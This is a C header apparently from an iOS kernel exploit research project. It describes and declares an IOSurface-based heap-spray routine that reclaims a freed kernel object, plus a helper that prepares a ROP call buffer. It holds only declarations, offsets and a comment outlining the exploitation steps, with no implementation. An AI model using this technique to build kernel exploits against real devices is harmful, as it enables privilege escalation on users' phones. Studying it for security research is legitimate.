/*
	This file is responsible for the heap spraying.
	The heap spraying technique used here takes advantage of the IOSurface set\get prop data,
		allowing us not only to spray freely using any size we want (OSData), 
		but also to repeatedly read the sprayed value back!

	The technique here is quite simple:
		* Allocate some data to fill-up "holes"
		* Allocate an IOSurface object.
		* Reveal its kernel address using our vulnerability.
		* Free it (we actually use another vulnerability for that, because leaking the address also leaks a refcount).
		* Spray a lot and assume we're going to catch the IOSurface object.

		Note: Since we're not writing a weapon here, I didn't bother researching how the memory allocator on iOS works.
			  Weaponizing it will probably require you to do so.
*/

#include <mach/mach.h>

#ifndef __HEAP_SPRAY_H_
#define __HEAP_SPRAY_H_

#define NUMBER_OF_OBJECTS_TO_SPRAY									(100)
#define NUMBER_OF_OBJECTS_TO_CLOSE_HOLES							(0x100)

#define SYSCTL_HANDLER_SIZE											(0x50)
#define SPRAY_SYSCTL_HELPER											(0x100)
#define SPRAY_SYSCTL_HELPER_EXECUTION								(SPRAY_SYSCTL_HELPER + 0x28)
#define SPRAY_SYSCTL_HELPER_EXECUTION_ROP							(SPRAY_SYSCTL_HELPER_EXECUTION + 0x28)

kern_return_t heap_spray_init();
void heap_spray_cleanup();
kern_return_t heap_spray_start_spraying(uint64_t * kernel_allocated_data);
void heap_spray_prepare_buffer_for_rop(uint64_t function, uint64_t arg0, 
	uint64_t arg1, uint64_t arg2);


#endif /* __HEAP_SPRAY_H_ */
